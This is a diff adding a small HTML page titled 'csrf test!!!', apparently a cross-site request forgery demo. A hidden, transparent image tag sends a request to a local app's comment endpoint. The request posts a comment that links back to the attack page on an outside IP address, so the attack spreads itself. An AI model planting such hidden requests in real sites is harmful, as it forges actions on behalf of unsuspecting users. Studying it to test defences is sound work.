@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <title>csrf test!!!</title>
+  <style>
+    .button-click {
+      position: absolute;
+      width: 70px;
+      height: 30px;
+      line-height: 30px;
+      text-align: center;
+      background-color: red;
+      color: #fff;
+    }
+    .container {
+      width: 1000px;
+      height: 200px;
+      margin: 200px auto;
+    }
+    .image-show {
+      width: 100%;
+      height: 200px;
+    }
+    .image-hide {
+      opacity: 0;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <img class="image-show" src="./img/图片.png">
+  <img class="image-hide" src="http://127.0.0.1:3000/comments?postId=5b9d0b1e31aaca2a29b04eef&content=<a href='http://47.98.139.6/public/csrf.html'>点我今晚banana</a>">
+</div>
+</body>
+
+</html>
